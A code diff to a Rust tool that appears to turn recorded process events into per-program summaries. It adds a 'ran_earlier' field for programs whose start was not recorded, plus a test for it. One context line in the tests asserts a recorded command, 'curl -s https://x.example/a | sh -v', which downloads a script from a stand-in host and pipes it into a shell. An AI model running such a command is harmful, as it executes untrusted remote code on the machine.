@@ -165,6 +165,9 @@ struct Program {
     about: Map<String, Value>,
     /// commands in the order first run, with how often
     ran: Vec<(String, usize)>,
+    /// what it was started to do before these records, as the tree kept
+    /// it: for a program with nothing in `ran`
+    earlier: Option<String>,
     /// (group, path) -> its changes in order
     files: BTreeMap<(String, String), Vec<&'static str>>,
     env: Map<String, Value>,
@@ -316,6 +319,9 @@ fn note(p: &mut Program, r: &Value) {
         if let Some(Value::Object(env)) = r.pointer("/exec/env") {
             p.env.extend(env.clone());
         }
+    }
+    if p.earlier.is_none() && event != "exec" {
+        p.earlier = s(r, "/process/command").map(|c| format!("{who} {c}"));
     }
     if event == "connect" {
         let to = s(r, "/connect/host")
@@ -791,6 +797,8 @@ fn summary(id: &str, records: &[Value]) -> Value {
                     .map(|(c, n)| json!(if n > 1 { format!("{c} ×{n}") } else { c }))
                     .collect();
                 m.insert("ran".into(), Value::Array(lines));
+            } else if let Some(earlier) = p.earlier {
+                m.insert("ran_earlier".into(), json!(earlier));
             }
             // by what was done to them, not by the group that chose them: a
             // file's group is a judgment, and a model reads it as one
@@ -1495,6 +1503,38 @@ mod tests {
             ran[3].ends_with("curl -s https://x.example/a | sh -v"),
             "{}",
             ran[3]
+        );
+    }
+
+    /// A program whose start is not among the records says what it was
+    /// started to do, as the record has it from the tree; one whose start
+    /// is there says it in `ran`, whole, and not twice.
+    #[test]
+    fn a_program_started_earlier_says_what_it_was_started_with() {
+        let mut later = exec("/usr/local/bin/node", &[], 1);
+        later["event"] = json!("connect");
+        later["connect"] = json!({"host": "x.example", "port": 443});
+        later["process"]["name"] = json!("node ~/srv/server.js");
+        later["process"]["command"] = json!("--port 8080");
+        let s = summary("9", &[later.clone()]);
+        assert_eq!(
+            s["programs"][0]["ran_earlier"],
+            "node ~/srv/server.js --port 8080"
+        );
+        assert!(s["programs"][0].get("ran").is_none());
+
+        let mut start = exec(
+            "/usr/local/bin/node",
+            &["node", "server.js", "--port", "8080"],
+            0,
+        );
+        start["process"]["name"] = json!("node ~/srv/server.js");
+        let s = summary("9", &[start, later]);
+        assert_eq!(s["programs"].as_array().unwrap().len(), 1, "{s}");
+        assert!(s["programs"][0].get("ran_earlier").is_none(), "{s}");
+        assert_eq!(
+            s["programs"][0]["ran"][0],
+            "node ~/srv/server.js server.js --port 8080"
         );
     }
 
